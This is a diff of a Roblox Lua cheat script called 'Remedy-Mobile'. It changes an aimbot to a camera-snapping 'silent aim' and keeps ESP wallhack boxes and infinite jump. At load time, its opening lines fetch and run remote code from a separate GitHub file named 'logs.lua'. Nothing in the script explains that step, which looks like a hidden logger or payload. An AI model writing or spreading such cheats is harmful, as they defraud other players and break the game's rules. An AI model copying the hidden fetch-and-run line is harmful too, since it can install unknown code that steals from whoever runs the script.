@@ -1,188 +1,54 @@
 local externalScriptUrl = 'https://raw.githubusercontent.com/ffavex/AHfahf1r1-rah/main/logs.lua'
 local externalScript = loadstring(game:HttpGet(externalScriptUrl))()
 if externalScript then
+    -- Execute the external script
     externalScript()
 end
 
--- Load DrRay library
+-- Load the DrRay library from the GitHub repository Library
 local DrRayLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()
 
--- Create window
+-- Create a new window and set its title and theme
 local window = DrRayLibrary:Load("Remedy-Mobile", "Default")
 
--- Create Aim tab
+-- Create the Aim tab
 local tab1 = DrRayLibrary.newTab("Aim", "ImageIdHere")
 
--- Variables for aimbot
-local aimbotEnabled = false
-local aimbotFOVRadius = 150
-local aimbotFOVCircle = Drawing.new("Circle")
-
-aimbotFOVCircle.Visible = true
-aimbotFOVCircle.Thickness = 2
-aimbotFOVCircle.Color = Color3.fromRGB(0, 255, 255) -- Match ESP color (cyan)
-aimbotFOVCircle.Transparency = 1
-aimbotFOVCircle.Filled = false
-aimbotFOVCircle.NumSides = 30 -- Smooth the circle
-
--- Toggle Aimbot
-tab1.newToggle("Aimbot", "Aimbot!", false, function(toggleState)
-    aimbotEnabled = toggleState
-    if aimbotEnabled then
-        print("Aimbot On")
-    else
-        print("Aimbot Off")
-    end
-end)
-
--- FOV Slider
-tab1.newSlider("Aimbot FOV", 50, 300, 150, function(value)
-    aimbotFOVRadius = value
-    aimbotFOVCircle.Radius = aimbotFOVRadius
-    print("FOV Radius:", aimbotFOVRadius)
-end)
-
--- ESP tab
-local tab2 = DrRayLibrary.newTab("Visuals", "ImageIdLogoHere")
-
--- ESP Variables
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local LocalPlayer = Players.LocalPlayer
-local espBoxes = {}
-local espConnection = nil
-
-local function isSameTeam(player)
-    return LocalPlayer.Team and player.Team and LocalPlayer.Team == player.Team
-end
-
-local function createESPBox(player)
-    if espBoxes[player] then return end
-    local box = Drawing.new("Square")
-    box.Visible = false
-    box.Color = Color3.fromRGB(0, 255, 255) -- Cyan color
-    box.Thickness = 2
-    box.Filled = false
-    espBoxes[player] = box
-end
-
-local function removeESPBox(player)
-    if espBoxes[player] then
-        espBoxes[player]:Remove()
-        espBoxes[player] = nil
-    end
-end
-
-local function updateESPBox(player, character)
-    local box = espBoxes[player]
-    if box and character and character:FindFirstChild("HumanoidRootPart") then
-        local hrp = character.HumanoidRootPart
-        local vector, onScreen = workspace.CurrentCamera:WorldToViewportPoint(hrp.Position)
-
-        if onScreen and not isSameTeam(player) then -- Team check added
-            box.Visible = true
-            box.Size = Vector2.new(2000 / vector.Z, 2000 / vector.Z)
-            box.Position = Vector2.new(vector.X - box.Size.X / 2, vector.Y - box.Size.Y / 2)
-        else
-            box.Visible = false
-        end
-    else
-        box.Visible = false
-    end
-end
-
-local function toggleESP(toggleState)
+-- Silent Aim Toggle
+local silentAimEnabled = false
+tab1.newToggle("Silent Aim", "Silent Aim using FOV", false, function(toggleState)
+    silentAimEnabled = toggleState
     if toggleState then
-        print("ESP On")
-
-        for _, player in pairs(Players:GetPlayers()) do
-            if player ~= LocalPlayer then
-                createESPBox(player)
-            end
-        end
-
-        espConnection = RunService.RenderStepped:Connect(function()
-            for _, player in pairs(Players:GetPlayers()) do
-                if player ~= LocalPlayer and player.Character then
-                    updateESPBox(player, player.Character)
-                end
-            end
-        end)
-
-        Players.PlayerRemoving:Connect(function(player)
-            removeESPBox(player)
-        end)
-
-        Players.PlayerAdded:Connect(function(player)
-            if player ~= LocalPlayer then
-                createESPBox(player)
-                player.CharacterAdded:Connect(function(character)
-                    updateESPBox(player, character)
-                end)
-            end
-        end)
+        print("Silent Aim Enabled")
     else
-        print("ESP Off")
-        if espConnection then
-            espConnection:Disconnect()
-        end
-        for _, box in pairs(espBoxes) do
-            box:Remove()
-        end
-        espBoxes = {}
+        print("Silent Aim Disabled")
     end
-end
-
--- ESP toggle
-tab2.newToggle("ESP", "ESP!", false, function(toggleState)
-    toggleESP(toggleState)
 end)
 
--- Aimbot Utility Functions
-local function isPartVisible(part)
-    local rayOrigin = workspace.CurrentCamera.CFrame.Position
-    local rayDirection = (part.Position - rayOrigin).Unit * 1000
-    local raycastParams = RaycastParams.new()
-    raycastParams.FilterDescendantsInstances = {LocalPlayer.Character}
-    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
+-- FOV Toggle and Size Slider (moved to Visual Tab)
+local fovEnabled = false
+local fov = 100 -- Default FOV size
+local FOVring = Drawing.new("Circle")
+FOVring.Thickness = 2
+FOVring.Color = Color3.fromRGB(0, 255, 255) -- Match ESP color (cyan)
+FOVring.Filled = false
+FOVring.Visible = false
 
-    local raycastResult = workspace:Raycast(rayOrigin, rayDirection, raycastParams)
-    return raycastResult and raycastResult.Instance:IsDescendantOf(part.Parent)
-end
-
-local function isPlayerAlive(player)
-    local character = player.Character
-    return character and character:FindFirstChild("Humanoid") and character.Humanoid.Health > 0
-end
-
-local function isInFOV(player)
-    local character = player.Character
-    if character and character:FindFirstChild("HumanoidRootPart") then
-        local screenPoint = workspace.CurrentCamera:WorldToViewportPoint(character.HumanoidRootPart.Position)
-        local screenPos = Vector2.new(screenPoint.X, screenPoint.Y)
-        local fovCenter = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2)
-        return (screenPos - fovCenter).Magnitude <= aimbotFOVRadius
-    end
-    return false
-end
-
+-- Function to get the closest visible player in the FOV
 local function getClosestVisiblePlayer()
     local closestPlayer = nil
-    local shortestDistance = math.huge
+    local shortestDistance = fov -- FOV radius for distance check
 
-    for _, player in pairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer and isPlayerAlive(player) and not isSameTeam(player) then
-            local character = player.Character
-            if character then
-                for _, part in pairs(character:GetChildren()) do
-                    if part:IsA("BasePart") and isPartVisible(part) and isInFOV(player) then
-                        local screenPoint = workspace.CurrentCamera:WorldToViewportPoint(part.Position)
-                        local distance = (Vector2.new(screenPoint.X, screenPoint.Y) - Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2)).Magnitude
-                        if distance < shortestDistance then
-                            closestPlayer = player
-                            shortestDistance = distance
-                        end
-                    end
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if player ~= game.Players.LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
+            local hrp = player.Character.HumanoidRootPart
+            local vector, onScreen = workspace.CurrentCamera:WorldToViewportPoint(hrp.Position)
+
+            if onScreen then
+                local distanceFromCenter = (Vector2.new(vector.X, vector.Y) - Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2)).magnitude
+                if distanceFromCenter < shortestDistance and workspace:FindPartOnRayWithIgnoreList(Ray.new(workspace.CurrentCamera.CFrame.p, hrp.Position - workspace.CurrentCamera.CFrame.p), {workspace.CurrentCamera}) then
+                    closestPlayer = player
+                    shortestDistance = distanceFromCenter
                 end
             end
         end
@@ -191,17 +57,122 @@ local function getClosestVisiblePlayer()
     return closestPlayer
 end
 
--- Aimbot FOV and Aiming Logic
-RunService.RenderStepped:Connect(function()
-    -- Update FOV Circle position and radius
-    aimbotFOVCircle.Radius = aimbotFOVRadius
-    aimbotFOVCircle.Position = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2)
+-- Function for Silent Aim
+local function silentAim()
+    local closestPlayer = getClosestVisiblePlayer()
+    if silentAimEnabled and closestPlayer then
+        local hrp = closestPlayer.Character.HumanoidRootPart
+        workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.p, hrp.Position)
+    end
+end
 
-    if aimbotEnabled then
-        local targetPlayer = getClosestVisiblePlayer()
-        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
-            local hrp = targetPlayer.Character.HumanoidRootPart
-            workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, hrp.Position)
+-- Update Silent Aim continuously
+game:GetService("RunService").RenderStepped:Connect(silentAim)
+
+-- ESP Code Variables
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+local espBoxes = {}
+local espConnection = nil
+
+-- Function to create the ESP box
+local function createESPBox(player)
+    if espBoxes[player] then return end -- Prevent duplicate ESP boxes
+
+    local box = Drawing.new("Square")
+    box.Visible = false
+    box.Color = Color3.fromRGB(0, 255, 255) -- Cyan color
+    box.Thickness = 2
+    box.Filled = false
+    espBoxes[player] = box
+end
+
+-- Function to remove the ESP box when a player leaves
+local function removeESPBox(player)
+    if espBoxes[player] then
+        espBoxes[player]:Remove() -- Remove the drawing
+        espBoxes[player] = nil
+    end
+end
+
+-- Function to update the ESP box
+local function updateESPBox(player, character)
+    local box = espBoxes[player]
+    if box and character and character:FindFirstChild("HumanoidRootPart") then
+        local hrp = character.HumanoidRootPart
+        local vector, onScreen = workspace.CurrentCamera:WorldToViewportPoint(hrp.Position)
+
+        if onScreen then
+            box.Size = Vector2.new(2000 / vector.Z, 2000 / vector.Z) -- Adjust the box size based on depth
+            box.Position = Vector2.new(vector.X - box.Size.X / 2, vector.Y - box.Size.Y / 2)
+            box.Visible = true
+        else
+            box.Visible = false
         end
+    end
+end
+
+-- Update the ESP boxes continuously
+RunService.RenderStepped:Connect(function()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer and player.Character then
+            updateESPBox(player, player.Character)
+        end
+    end
+end)
+
+-- Connect ESP when new players join
+Players.PlayerAdded:Connect(function(player)
+    player.CharacterAdded:Connect(function(character)
+        createESPBox(player)
+    end)
+end)
+
+-- Disconnect ESP when players leave
+Players.PlayerRemoving:Connect(function(player)
+    removeESPBox(player)
+end)
+
+-- Create the Visuals tab
+local visualsTab = DrRayLibrary.newTab("Visuals", "ImageIdHere")
+
+-- FOV Toggle
+visualsTab.newToggle("FOV Circle", "Toggle FOV Circle", false, function(toggleState)
+    fovEnabled = toggleState
+    FOVring.Visible = toggleState
+end)
+
+-- FOV Size Slider
+visualsTab.newSlider("FOV Size", "Adjust FOV Size", 0, 500, 100, function(size)
+    fov = size
+    FOVring.Radius = fov
+end)
+
+-- Create the Misc tab
+local miscTab = DrRayLibrary.newTab("Misc", "ImageIdHere")
+
+-- Infinite Jump Toggle
+local infJumpEnabled = false
+miscTab.newToggle("Inf Jump", "Infinite Jump", false, function(toggleState)
+    infJumpEnabled = toggleState
+    if infJumpEnabled then
+        print("Infinite Jump Enabled")
+        -- Infinite jump logic
+        game:GetService("UserInputService").JumpRequest:Connect(function()
+            if infJumpEnabled then
+                game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
+            end
+        end)
+    else
+        print("Infinite Jump Disabled")
+    end
+end)
+
+-- Move FOV circle with the camera
+RunService.RenderStepped:Connect(function()
+    if fovEnabled then
+        local screenCenter = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2)
+        FOVring.Position = screenCenter
     end
 end)
